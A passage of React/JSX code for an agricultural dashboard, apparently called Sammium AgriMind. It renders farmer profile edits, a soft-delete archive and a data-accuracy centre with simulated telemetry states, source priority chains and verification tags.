                                className="px-2 py-0.5 bg-rose-50 hover:bg-rose-100 text-rose-700 dark:bg-rose-950/40 dark:text-rose-400 text-[8px] font-black uppercase rounded cursor-pointer"
                              >
                                Soft Delete
                              </button>
                            </div>
                          </div>

                          {/* Profile Data */}
                          <div className="grid grid-cols-3 gap-2 text-[9px] font-bold text-slate-600 dark:text-slate-400 bg-slate-50 dark:bg-slate-950/40 p-2 rounded-lg leading-none">
                            <div><span className="text-[7px] text-slate-400 block uppercase mb-0.5">Crop type</span>{p.cropType}</div>
                            <div><span className="text-[7px] text-slate-400 block uppercase mb-0.5">Area size</span>{p.area} Hectares</div>
                            <div><span className="text-[7px] text-slate-400 block uppercase mb-0.5">Barangay</span>{p.barangay}</div>
                          </div>

                          {/* Version Logs for this profile */}
                          <div className="space-y-1">
                            <span className="text-[7px] font-black uppercase text-slate-400 block">Version History (Audit trail):</span>
                            <div className="space-y-1 bg-black/5 dark:bg-black/35 p-2 rounded-lg font-mono text-[8px] leading-normal max-h-24 overflow-y-auto">
                              {p.versions.map((v, idx) => (
                                <div key={idx} className="border-b border-slate-200/40 dark:border-slate-800 pb-1 mb-1 last:border-0 last:pb-0 last:mb-0">
                                  <div className="flex justify-between text-slate-400">
                                    <span>{v.timestamp} • {v.changedBy}</span>
                                    <span className="text-cyan-500">v{idx + 1}</span>
                                  </div>
                                  <p className="text-slate-700 dark:text-slate-300 font-semibold">{v.changeSummary}</p>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Right: Soft deleted recoveries and Immutable system tables */}
                  <div className="space-y-4">
                    {/* Active Edit Form */}
                    {selectedProfileId && (
                      <div className="p-4 bg-amber-50/50 border border-amber-100 dark:bg-amber-950/20 dark:border-amber-900/40 rounded-2xl space-y-3">
                        <span className="text-[9px] font-black uppercase text-amber-800 dark:text-amber-400 block">Edit Record (Enforcing history)</span>
                        <form onSubmit={handleSaveEdit} className="space-y-2">
                          <div className="grid grid-cols-2 gap-2">
                            <div>
                              <label className="text-[7px] font-black uppercase text-slate-400 block mb-1">Crop Type</label>
                              <input 
                                type="text" 
                                value={editCropValue} 
                                onChange={(e) => setEditCropValue(e.target.value)}
                                className="w-full px-2 py-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-lg text-[9px] font-bold dark:text-white"
                              />
                            </div>
                            <div>
                              <label className="text-[7px] font-black uppercase text-slate-400 block mb-1">Area size</label>
                              <input 
                                type="text" 
                                value={editAreaValue} 
                                onChange={(e) => setEditAreaValue(e.target.value)}
                                className="w-full px-2 py-1 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-lg text-[9px] font-bold dark:text-white"
                              />
                            </div>
                          </div>
                          <div className="flex gap-2 justify-end">
                            <button 
                              type="button" 
                              onClick={() => setSelectedProfileId(null)}
                              className="px-2 py-1 text-slate-500 text-[8px] font-black uppercase"
                            >
                              Cancel
                            </button>
                            <button 
                              type="submit" 
                              className="px-3 py-1 bg-amber-600 hover:bg-amber-700 text-white text-[8px] font-black uppercase rounded-lg"
                            >
                              Commit Update
                            </button>
                          </div>
                        </form>
                      </div>
                    )}

                    {/* Archived/Recycle Bin */}
                    <div className="space-y-2">
                      <span className="text-[9px] font-black uppercase text-slate-400 block">Soft Deleted Archive Chamber (Admin recovery)</span>
                      <div className="p-4 bg-slate-50 dark:bg-slate-950/20 rounded-2xl border border-slate-100 dark:border-white/5 space-y-2 min-h-[100px] flex flex-col justify-center">
                        {archivedProfiles.length > 0 ? (
                          archivedProfiles.map(ap => (
                            <div key={ap.id} className="p-2.5 bg-rose-50/50 dark:bg-rose-950/15 border border-rose-100 dark:border-rose-900/20 rounded-xl flex items-center justify-between">
                              <div>
                                <h6 className="font-extrabold text-[10px] text-rose-900 dark:text-rose-400">{ap.farmerName}</h6>
                                <span className="text-[8px] font-mono text-slate-400 block">Deleted: {ap.deletedAt.split(' ')[1]}</span>
                              </div>
                              <button 
                                onClick={() => handleRestoreRecord(ap.id)}
                                className="px-2 py-0.5 bg-emerald-600 hover:bg-emerald-700 text-white text-[8px] font-black uppercase rounded cursor-pointer"
                              >
                                Restore
                              </button>
                            </div>
                          ))
                        ) : (
                          <div className="text-center text-slate-400 py-4 font-bold text-[9px] uppercase tracking-wider">
                            Archive Chamber Empty
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Immutable logs proof */}
                    <div className="space-y-2">
                      <span className="text-[9px] font-black uppercase text-slate-400 block">Immutable Records (Verification Proof)</span>
                      <div className="p-4 bg-slate-900 text-slate-300 rounded-2xl border border-slate-800 space-y-2">
                        <span className="text-[7px] text-slate-500 font-black block uppercase">Historical weather imports (PAGASA lock):</span>
                        <div className="space-y-1.5 font-mono text-[8px] leading-tight">
                          <div className="flex justify-between border-b border-slate-800 pb-1">
                            <span>07-07 02:00</span>
                            <span className="text-emerald-400">PAGASA Verified</span>
                            <span className="text-slate-500">Locked</span>
                          </div>
                          <div className="flex justify-between border-b border-slate-800 pb-1">
                            <span>07-07 01:00</span>
                            <span className="text-emerald-400">PAGASA Verified</span>
                            <span className="text-slate-500">Locked</span>
                          </div>
                          <div className="flex justify-between">
                            <span>07-07 00:00</span>
                            <span className="text-emerald-400">PAGASA Verified</span>
                            <span className="text-slate-500">Locked</span>
                          </div>
                        </div>
                        <p className="text-[8px] text-slate-400 font-semibold leading-normal pt-1.5 border-t border-slate-800">
                          ⚖️ Core ledger tables cannot be modified or purged under legal, municipal agricultural compliance regulations.
                        </p>
                      </div>
                    </div>

                  </div>
                </div>

              </div>
            </div>
          )}

          {/* TAB: DATA ACCURACY & SOURCING PROVENANCE CENTER */}
          {activeSubTab === "accuracy" && (
            <div className="bg-white dark:bg-slate-900 p-8 rounded-3xl border border-slate-150 dark:border-white/5 shadow-sm space-y-8 animate-fade-in">
              {/* Header */}
              <div className="flex items-center justify-between border-b border-slate-100 dark:border-white/5 pb-4 flex-wrap gap-4">
                <div className="space-y-1">
                  <h3 className="text-sm font-black uppercase text-slate-900 dark:text-white tracking-wider flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4 text-emerald-500 animate-pulse" />
                    Data Accuracy, Provenance & Sourcing Governance Center
                  </h3>
                  <p className="text-[10px] text-slate-400 font-semibold">
                    Configure on-screen reliability indicators, resolve cross-source conflict logs, track user-submitted verification pipelines, and run relational integrity scans.
                  </p>
                </div>
                <div className="flex items-center gap-1.5 px-3 py-1 bg-cyan-50 dark:bg-cyan-950/30 border border-cyan-100 dark:border-cyan-900/30 rounded-xl text-[10px] font-bold text-cyan-600 dark:text-cyan-400">
                  <span className="w-1.5 h-1.5 bg-cyan-500 rounded-full animate-ping" />
                  <span>Sourcing Protocol v1.0.4 Active</span>
                </div>
              </div>

              {/* SECTION 1: On-Screen Reliability Widget Sandbox */}
              <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-6">
                <div className="flex items-center justify-between flex-wrap gap-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider flex items-center gap-1.5">
                      <Smartphone className="w-3.5 h-3.5 text-cyan-500" />
                      1. Dynamic On-Screen Reliability Widget Sandbox
                    </span>
                    <p className="text-[10px] text-slate-500 font-semibold">
                      See how our important dashboard screens adapt to real-time telemetry changes. Use the control panel to simulate data stale-ness or connection drops.
                    </p>
                  </div>
                  
                  {/* Status controls */}
                  <div className="flex gap-2 bg-white dark:bg-slate-900 p-1.5 rounded-xl border border-slate-200 dark:border-white/5">
                    <button 
                      onClick={() => {
                        setAccuracyWidgetStatus("healthy");
                        addLog("Widget Telemetry Switched", "info", "WidgetSandbox", "Switched testing telemetry link to: Healthy & Live Connection.");
                      }}
                      className={`px-2.5 py-1 text-[8px] font-black uppercase rounded-lg transition-colors cursor-pointer ${
                        accuracyWidgetStatus === "healthy" 
                          ? "bg-emerald-600 text-white" 
                          : "text-slate-500 hover:text-slate-800"
                      }`}
                    >
                      Healthy (Live)
                    </button>
                    <button 
                      onClick={() => {
                        setAccuracyWidgetStatus("stale");
                        addLog("Widget Telemetry Switched", "warning", "WidgetSandbox", "Switched testing telemetry link to: Stale / Cached Mode (> 2h limit exceeded).");
                      }}
                      className={`px-2.5 py-1 text-[8px] font-black uppercase rounded-lg transition-colors cursor-pointer ${
                        accuracyWidgetStatus === "stale" 
                          ? "bg-amber-500 text-white" 
                          : "text-slate-500 hover:text-slate-800"
                      }`}
                    >
                      Stale (Cached)
                    </button>
                    <button 
                      onClick={() => {
                        setAccuracyWidgetStatus("offline");
                        addLog("Widget Telemetry Switched", "critical", "WidgetSandbox", "Switched testing telemetry link to: Offline (Simulated endpoint crash).");
                      }}
                      className={`px-2.5 py-1 text-[8px] font-black uppercase rounded-lg transition-colors cursor-pointer ${
                        accuracyWidgetStatus === "offline" 
                          ? "bg-rose-600 text-white" 
                          : "text-slate-500 hover:text-slate-800"
                      }`}
                    >
                      Offline (Failsafe)
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                  {/* Left Column: Sandbox Selector and Controls */}
                  <div className="space-y-4 bg-white dark:bg-slate-900 p-5 rounded-2xl border border-slate-200 dark:border-white/5 flex flex-col justify-between">
                    <div className="space-y-3">
                      <span className="text-[9px] font-black uppercase text-slate-400 block">Select Target Widget View</span>
                      <div className="grid grid-cols-3 gap-2">
                        <button 
                          onClick={() => setAccuracyWidget("weather")}
                          className={`py-2 text-[9px] font-black uppercase rounded-lg border cursor-pointer transition-all ${
                            accuracyWidget === "weather" 
                              ? "bg-slate-900 text-white dark:bg-cyan-600 border-transparent shadow-sm" 
                              : "bg-slate-50 hover:bg-slate-100 border-slate-200 dark:bg-slate-950 dark:border-white/5 text-slate-500"
                          }`}
                        >
                          Weather
                        </button>
                        <button 
                          onClick={() => setAccuracyWidget("irrigation")}
                          className={`py-2 text-[9px] font-black uppercase rounded-lg border cursor-pointer transition-all ${
                            accuracyWidget === "irrigation" 
                              ? "bg-slate-900 text-white dark:bg-cyan-600 border-transparent shadow-sm" 
                              : "bg-slate-50 hover:bg-slate-100 border-slate-200 dark:bg-slate-950 dark:border-white/5 text-slate-500"
                          }`}
                        >
                          Irrigation
                        </button>
                        <button 
                          onClick={() => setAccuracyWidget("market")}
                          className={`py-2 text-[9px] font-black uppercase rounded-lg border cursor-pointer transition-all ${
                            accuracyWidget === "market" 
                              ? "bg-slate-900 text-white dark:bg-cyan-600 border-transparent shadow-sm" 
                              : "bg-slate-50 hover:bg-slate-100 border-slate-200 dark:bg-slate-950 dark:border-white/5 text-slate-500"
                          }`}
                        >
                          Market
                        </button>
                      </div>

                      {/* Confidence slider adjustment */}
                      <div className="space-y-2 pt-2 border-t border-slate-150 dark:border-white/5">
                        <div className="flex justify-between text-[9px] font-black uppercase">
                          <span className="text-slate-400">Telemetry Confidence:</span>
                          <span className="text-cyan-600 dark:text-cyan-400">{accuracyConfidenceOverride}%</span>
                        </div>
                        <input 
                          type="range" 
                          min="10" 
                          max="100" 
                          value={accuracyConfidenceOverride} 
                          onChange={(e) => setAccuracyConfidenceOverride(parseInt(e.target.value))}
                          className="w-full accent-cyan-500 cursor-pointer"
                        />
                        <div className="flex justify-between text-[8px] font-semibold text-slate-400">
                          <span>10% Low</span>
                          <span>70% Medium</span>
                          <span>100% High</span>
                        </div>
                      </div>
                    </div>

                    <div className="text-[9px] font-semibold text-slate-400 leading-relaxed pt-3 border-t border-slate-150 dark:border-white/5 bg-slate-50 dark:bg-slate-950/20 p-3 rounded-xl">
                      💡 <span className="font-bold text-slate-600 dark:text-slate-300">Rule Validation Rule:</span> Confidence level is evaluated as 
                      <span className="text-cyan-600 dark:text-cyan-400 font-bold"> High (≥ 85%)</span>, 
                      <span className="text-amber-500 font-bold"> Medium (60%-84%)</span>, or 
                      <span className="text-rose-500 font-bold"> Low (&lt; 60%)</span> based on historical data latency, station sync count, and verified sensor readings.
                    </div>
                  </div>

                  {/* Right 2 Columns: Live Widget Render Preview */}
                  <div className="lg:col-span-2 bg-slate-950 p-6 rounded-2xl border border-slate-800 text-white font-mono text-xs flex flex-col justify-between relative overflow-hidden min-h-[250px]">
                    <div className="absolute top-2 right-2 flex items-center gap-1.5 px-2 py-0.5 bg-cyan-950/40 border border-cyan-800 rounded text-[7px] font-bold text-cyan-400 uppercase">
                      <span className="w-1 h-1 bg-cyan-400 rounded-full animate-ping" />
                      <span>Live Mobile UI Simulator</span>
                    </div>

                    {/* Rendering the active widget */}
                    <div className="space-y-4 my-auto">
                      {accuracyWidget === "weather" && (
                        <div className="space-y-3">
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider">⛅ Botolan Live Weather Dashboard</span>
                            {/* Verification Tag */}
                            <div className="flex items-center gap-1.5">
                              {accuracyWidgetStatus === "healthy" && (
                                <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Verified
                                </span>
                              )}
                              {accuracyWidgetStatus === "stale" && (
                                <span className="px-2 py-0.5 bg-amber-500/10 border border-amber-500/30 text-amber-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Historical
                                </span>
                              )}
                              {accuracyWidgetStatus === "offline" && (
                                <span className="px-2 py-0.5 bg-rose-500/10 border border-rose-500/30 text-rose-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Unavailable
                                </span>
                              )}
                            </div>
                          </div>

                          {accuracyWidgetStatus === "offline" ? (
                            <div className="p-4 bg-rose-950/30 border border-rose-900/50 rounded-xl space-y-2 text-rose-300">
                              <span className="text-[10px] font-black uppercase tracking-wider block">⚠️ TELEMETRY CONNECTION TIMEOUT</span>
                              <p className="text-[10px] font-semibold leading-relaxed">
                                Unable to retrieve current weather from PAGASA Subic Radar Station. The system does not know current values because external services are offline.
                              </p>
                              <div className="text-[8px] font-mono text-rose-400 flex justify-between">
                                <span>Failsafe Status: Waiting for verified data...</span>
                                <span>Last Verified: 08:42 AM (2.5h ago)</span>
                              </div>
                            </div>
                          ) : (
                            <div className="grid grid-cols-2 gap-4">
                              <div className="p-3 bg-white/5 rounded-xl border border-white/10 space-y-1">
                                <span className="text-[8px] font-bold text-slate-400 block uppercase">Temperature & Forecast</span>
                                <span className="text-xl font-black block tracking-tight">{accuracyWidgetStatus === "stale" ? "31.0°C" : "31.2°C"}</span>
                                <span className="text-[8px] text-slate-400 block">Drizzle with heavy wind gusts</span>
                              </div>
                              <div className="p-3 bg-white/5 rounded-xl border border-white/10 space-y-1">
                                <span className="text-[8px] font-bold text-slate-400 block uppercase">Precipitation Prob</span>
                                <span className="text-xl font-black block tracking-tight">{accuracyWidgetStatus === "stale" ? "80%" : "85%"}</span>
                                <span className="text-[8px] text-slate-400 block">High Chance of Rainfall</span>
                              </div>
                            </div>
                          )}
                        </div>
                      )}

                      {accuracyWidget === "irrigation" && (
                        <div className="space-y-3">
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider">💧 Precision Irrigation Soil Telemetry</span>
                            <div className="flex items-center gap-1.5">
                              {accuracyWidgetStatus === "healthy" && (
                                <span className="px-2 py-0.5 bg-violet-500/10 border border-violet-500/30 text-violet-400 text-[8px] font-black uppercase rounded-lg">
                                  ● AI Recommendation
                                </span>
                              )}
                              {accuracyWidgetStatus === "stale" && (
                                <span className="px-2 py-0.5 bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Estimated
                                </span>
                              )}
                              {accuracyWidgetStatus === "offline" && (
                                <span className="px-2 py-0.5 bg-rose-500/10 border border-rose-500/30 text-rose-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Unavailable
                                </span>
                              )}
                            </div>
                          </div>

                          {accuracyWidgetStatus === "offline" ? (
                            <div className="p-4 bg-rose-950/30 border border-rose-900/50 rounded-xl space-y-2 text-rose-300">
                              <span className="text-[10px] font-black uppercase tracking-wider block">⚠️ TELEMETRY CONNECTION TIMEOUT</span>
                              <p className="text-[10px] font-semibold leading-relaxed">
                                Soil moisture sensor probes offline. System cannot generate irrigation scheduler. Failsafe triggered.
                              </p>
                              <div className="text-[8px] font-mono text-rose-400">
                                Status: Telemetry read failed. No estimated recommendations will be generated to prevent crop root-rot risks.
                              </div>
                            </div>
                          ) : (
                            <div className="p-3.5 bg-white/5 rounded-xl border border-white/10 space-y-2">
                              <div className="flex justify-between items-center text-[10px] text-slate-300">
                                <span className="font-bold">Recommended action:</span>
                                <span className="px-2 py-0.5 bg-purple-900 text-purple-200 rounded text-[7px] font-bold">GEMINI CO-ASSIST</span>
                              </div>
                              <p className="text-[11px] font-bold tracking-wide text-white">
                                Hold manual irrigation valves. Active soil saturation index is {accuracyWidgetStatus === "stale" ? "34.2%" : "34.0%"} with pending storm fronts.
                              </p>
                              <div className="flex justify-between text-[8px] text-slate-400 pt-1.5 border-t border-white/10">
                                <span>Based on: PAGASA Doppler Radar, Field Sensor B</span>
                                <span>Confidence Rating: {accuracyConfidenceOverride}%</span>
                              </div>
                            </div>
                          )}
                        </div>
                      )}

                      {accuracyWidget === "market" && (
                        <div className="space-y-3">
                          <div className="flex items-center justify-between">
                            <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider">🌾 Botolan Municipal Price Index</span>
                            <div className="flex items-center gap-1.5">
                              {accuracyWidgetStatus === "healthy" && (
                                <span className="px-2 py-0.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Verified
                                </span>
                              )}
                              {accuracyWidgetStatus === "stale" && (
                                <span className="px-2 py-0.5 bg-amber-500/10 border border-amber-500/30 text-amber-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Estimated
                                </span>
                              )}
                              {accuracyWidgetStatus === "offline" && (
                                <span className="px-2 py-0.5 bg-rose-500/10 border border-rose-500/30 text-rose-400 text-[8px] font-black uppercase rounded-lg">
                                  ● Unavailable
                                </span>
                              )}
                            </div>
                          </div>

                          {accuracyWidgetStatus === "offline" ? (
                            <div className="p-4 bg-rose-950/30 border border-rose-900/50 rounded-xl space-y-2 text-rose-300">
                              <span className="text-[10px] font-black uppercase tracking-wider block">⚠️ EXTERNAL API TIMEOUT</span>
                              <p className="text-[10px] font-semibold leading-relaxed">
                                Department of Agriculture market boards inaccessible. System does not display guessed pricing to protect financial decision safety.
                              </p>
                              <div className="text-[8px] font-mono text-rose-400">
                                Failsafe Status: Waiting for verified data... (Last Verified: 06:00 AM)
                              </div>
                            </div>
                          ) : (
                            <div className="space-y-2">
                              <div className="p-3 bg-white/5 rounded-xl border border-white/10 flex justify-between items-center">
                                <div>
                                  <span className="text-[8px] font-bold text-slate-400 block uppercase">Palay Rice (Wet)</span>
                                  <span className="text-sm font-black text-white block">24.50 PHP / kg</span>
                                </div>
                                <div className="text-right">
                                  <span className="text-[8px] font-bold text-slate-400 block uppercase">Zambales Mango (Super)</span>
                                  <span className="text-sm font-black text-emerald-400 block">160.00 PHP / kg</span>
                                </div>
                              </div>
                              <p className="text-[8px] text-slate-400 italic">
                                * Master prices sourced directly from Department of Agriculture and certified local Botolan coop.
                              </p>
                            </div>
                          )}
                        </div>
                      )}
                    </div>

                    {/* Sourcing Information Footer */}
                    <div className="border-t border-white/10 pt-3 flex justify-between items-center flex-wrap gap-2 text-[8px] text-slate-400 font-semibold">
                      <div className="flex items-center gap-1.5">
                        <Clock className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                        <span>Sourcing Freshness: <span className="text-slate-200">{accuracyWidgetStatus === "healthy" ? "Fresh (Just now)" : accuracyWidgetStatus === "stale" ? "Outdated (2.5 hours ago)" : "Failed Link"}</span></span>
                      </div>
                      <div className="flex items-center gap-1.5">
                        <Info className="w-3.5 h-3.5 text-cyan-400 shrink-0" />
                        <span>Confidence Quality Tier: 
                          <span className={`font-black uppercase ml-1 ${
                            accuracyConfidenceOverride >= 85 
                              ? "text-emerald-400" 
                              : accuracyConfidenceOverride >= 60 
                                ? "text-amber-400" 
                                : "text-rose-400"
                          }`}>
                            {accuracyConfidenceOverride >= 85 ? "High Accuracy" : accuracyConfidenceOverride >= 60 ? "Medium Accuracy" : "Low Accuracy"}
                          </span>
                        </span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* SECTION 2: Sourcing Hierarchy & Discrepancy Cross-Checking Engine */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                {/* Weather and Market sources hierarchy list */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">2. Sourcing Priority Hierarchy</span>
                    <p className="text-[10px] text-slate-500 font-semibold">
                      AgriMind evaluates incoming data based on a strict priority chain. If a higher priority source fails, the system cascades gracefully.
                    </p>
                  </div>

                  <div className="space-y-3">
                    {/* Domain 1: Weather */}
                    <div className="p-3.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-2xl space-y-2">
                      <div className="flex justify-between items-center border-b border-slate-100 dark:border-white/5 pb-1.5">
                        <span className="text-[10px] font-black uppercase text-slate-800 dark:text-white">⛅ Weather Priority Chain</span>
                        <span className="text-[8px] font-mono text-cyan-500 font-bold uppercase">Source Priority Levels</span>
                      </div>
                      <div className="space-y-1.5 text-[10px] font-semibold">
                        <div className="flex justify-between items-center bg-emerald-50 dark:bg-emerald-950/20 px-2 py-1 rounded-lg">
                          <span>1. PAGASA Subic Radar (Primary)</span>
                          <span className="text-emerald-600 font-black">Authoritative</span>
                        </div>
                        <div className="flex justify-between items-center bg-slate-50 dark:bg-slate-950/40 px-2 py-1 rounded-lg text-slate-500">
                          <span>2. OpenWeatherMap API Node (Backup)</span>
                          <span>Secondary</span>
                        </div>
                        <div className="flex justify-between items-center bg-slate-50 dark:bg-slate-950/40 px-2 py-1 rounded-lg text-slate-500">
                          <span>3. Local Cache Database (Offline Failsafe)</span>
                          <span>Fallback</span>
                        </div>
                      </div>
                    </div>

                    {/* Domain 2: Market Prices */}
                    <div className="p-3.5 bg-white dark:bg-slate-900 border border-slate-200 dark:border-white/5 rounded-2xl space-y-2">
                      <div className="flex justify-between items-center border-b border-slate-100 dark:border-white/5 pb-1.5">
                        <span className="text-[10px] font-black uppercase text-slate-800 dark:text-white">🌾 Market Price Priority Chain</span>
                        <span className="text-[8px] font-mono text-cyan-500 font-bold uppercase">Source Priority Levels</span>
                      </div>
                      <div className="space-y-1.5 text-[10px] font-semibold">
                        <div className="flex justify-between items-center bg-emerald-50 dark:bg-emerald-950/20 px-2 py-1 rounded-lg">
                          <span>1. Dept of Agriculture Botolan (Primary)</span>
                          <span className="text-emerald-600 font-black">Authoritative</span>
                        </div>
                        <div className="flex justify-between items-center bg-slate-50 dark:bg-slate-950/40 px-2 py-1 rounded-lg text-slate-500">
                          <span>2. Botolan Municipal Ag Office (Backup)</span>
                          <span>Secondary</span>
                        </div>
                        <div className="flex justify-between items-center bg-slate-50 dark:bg-slate-950/40 px-2 py-1 rounded-lg text-slate-500">
                          <span>3. Poblacion Rice Cooperative Board</span>
                          <span>Consensus</span>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Sourcing conflicts resolution desk */}
                <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-4">
                  <div className="space-y-1">
                    <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">3. Sourcing Discrepancy & Conflict Resolver</span>
                    <p className="text-[10px] text-slate-500 font-semibold">
                      When multiple external sources report divergent readings, the system logs a discrepancy event. Operators can manually audit and verify resolution.
                    </p>
                  </div>

                  <div className="space-y-3">
                    {activeSourcingConflicts.map(c => (
                      <div key={c.id} className={`p-4 bg-white dark:bg-slate-900 border rounded-2xl space-y-2.5 transition-all ${
                        c.resolved ? "opacity-60 border-slate-200" : "border-amber-200 dark:border-amber-900/40 shadow-sm"
                      }`}>
                        <div className="flex items-center justify-between">
                          <div className="flex items-center gap-1.5">
                            <AlertTriangle className={`w-4 h-4 ${c.resolved ? "text-slate-400" : "text-amber-500 animate-bounce"}`} />
                            <span className="text-[10px] font-black text-slate-800 dark:text-white uppercase">{c.domain} Discrepancy</span>
                          </div>
                          <span className={`text-[8px] font-black uppercase px-2 py-0.5 rounded ${
                            c.resolved ? "bg-slate-100 text-slate-500" : "bg-amber-100 text-amber-800 animate-pulse"
                          }`}>
                            {c.resolved ? "Resolved" : "Divergence Detected"}
                          </span>
                        </div>
                        <p className="text-[10px] text-slate-600 dark:text-slate-400 leading-normal font-semibold">
                          {c.desc}
                        </p>
                        
                        {!c.resolved && (
                          <div className="flex justify-between items-center pt-2 border-t border-slate-100 dark:border-white/5">
                            <span className="text-[8px] font-mono text-slate-400">Conflict ID: {c.id}</span>
                            <button
                              onClick={() => handleResolveConflictItem(c.id)}
                              className="px-3 py-1 bg-amber-500 hover:bg-amber-600 text-white text-[8px] font-black uppercase rounded-lg transition-colors cursor-pointer"
                            >
                              Resolve (Prefer Authoritative Source)
                            </button>
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              </div>

              {/* SECTION 3: Official Verification Tags Guide & Registry */}
              <div className="p-6 bg-slate-50 dark:bg-slate-950/40 rounded-3xl border border-slate-100 dark:border-white/5 space-y-6">
                <div className="space-y-1">
                  <span className="text-[10px] font-black uppercase text-slate-400 tracking-wider block">4. Interactive Verification Tags Guide & Registry</span>
                  <p className="text-[10px] text-slate-500 font-semibold">
                    Every data record displayed in Sammium AgriMind carries a strict verification status. Filter below to see active simulated ledger records.
                  </p>
                </div>

                {/* Tags Guide grid */}
                <div className="grid grid-cols-2 md:grid-cols-6 gap-3">
                  <button 
                    onClick={() => setSelectedStatusTagFilter("all")}
                    className={`p-3 rounded-2xl border text-center transition-all cursor-pointer ${
                      selectedStatusTagFilter === "all" ? "bg-slate-900 text-white border-transparent shadow-sm" : "bg-white dark:bg-slate-900 text-slate-600 border-slate-150"
                    }`}
                  >
                    <span className="text-[9px] font-black uppercase block">Show All</span>
                    <span className="text-[7px] text-slate-400 block font-semibold mt-1">Full database records</span>
                  </button>
                  <button 
                    onClick={() => setSelectedStatusTagFilter("verified")}
                    className={`p-3 rounded-2xl border text-center transition-all cursor-pointer ${
                      selectedStatusTagFilter === "verified" ? "bg-emerald-600 text-white border-transparent shadow-sm" : "bg-white dark:bg-slate-900 border-slate-150"
                    }`}
                  >
                    <span className="text-[9px] font-black text-emerald-500 uppercase block">🟢 Verified</span>
                    <span className="text-[7px] text-slate-400 block font-semibold mt-1">Vetted telemetry or human audit</span>
                  </button>
                  <button 
                    onClick={() => setSelectedStatusTagFilter("estimated")}
                    className={`p-3 rounded-2xl border text-center transition-all cursor-pointer ${
                      selectedStatusTagFilter === "estimated" ? "bg-amber-500 text-white border-transparent shadow-sm" : "bg-white dark:bg-slate-900 border-slate-150"
                    }`}
                  >
                    <span className="text-[9px] font-black text-amber-500 uppercase block">🟡 Estimated</span>
                    <span className="text-[7px] text-slate-400 block font-semibold mt-1">Calculated trends / sensors</span>
                  </button>
                  <button 
                    onClick={() => setSelectedStatusTagFilter("forecast")}
                    className={`p-3 rounded-2xl border text-center transition-all cursor-pointer ${
                      selectedStatusTagFilter === "forecast" ? "bg-blue-600 text-white border-transparent shadow-sm" : "bg-white dark:bg-slate-900 border-slate-150"
                    }`}
                  >
                    <span className="text-[9px] font-black text-blue-500 uppercase block">🔵 Forecast</span>
                    <span className="text-[7px] text-slate-400 block font-semibold mt-1">Numerical future models</span>
                  </button>
                  <button 
                    onClick={() => setSelectedStatusTagFilter("ai_recommendation")}
                    className={`p-3 rounded-2xl border text-center transition-all cursor-pointer ${
                      selectedStatusTagFilter === "ai_recommendation" ? "bg-purple-600 text-white border-transparent shadow-sm" : "bg-white dark:bg-slate-900 border-slate-150"
                    }`}
                  >
                    <span className="text-[9px] font-black text-purple-500 uppercase block">🟣 AI Recommend</span>
                    <span className="text-[7px] text-slate-400 block font-semibold mt-1">Gemini AI synthesizations</span>
                  </button>
                  <button 
                    onClick={() => setSelectedStatusTagFilter("historical")}
                    className={`p-3 rounded-2xl border text-center transition-all cursor-pointer ${
                      selectedStatusTagFilter === "historical" ? "bg-slate-500 text-white border-transparent shadow-sm" : "bg-white dark:bg-slate-900 border-slate-150"
                    }`}
                  >
                    <span className="text-[9px] font-black text-slate-400 uppercase block">⚪ Historical</span>
                    <span className="text-[7px] text-slate-400 block font-semibold mt-1">Locked static legacy references</span>
                  </button>
                </div>

                {/* Filtered records grid */}
                <div className="bg-white dark:bg-slate-900 p-4 rounded-2xl border border-slate-150 dark:border-white/5">
                  <div className="overflow-x-auto">
                    <table className="w-full text-[10px] text-left">
                      <thead>
                        <tr className="border-b border-slate-100 dark:border-white/5 text-[8px] font-black uppercase text-slate-400 tracking-wider">
                          <th className="py-2.5">Domain Category</th>
                          <th className="py-2.5">Target Value</th>
                          <th className="py-2.5">Status Certification</th>
                          <th className="py-2.5">Provenance Source Authority</th>
                          <th className="py-2.5 text-right">Last Sync Freshness</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-slate-50 dark:divide-white/5 text-[10px] font-semibold text-slate-700 dark:text-slate-300">
                        {/* Record 1 */}
                        {(selectedStatusTagFilter === "all" || selectedStatusTagFilter === "verified") && (
                          <tr>
                            <td className="py-3 font-bold text-slate-900 dark:text-white">Soil Moisture Level</td>
                            <td className="py-3 font-mono">18.4% (Field A probe)</td>
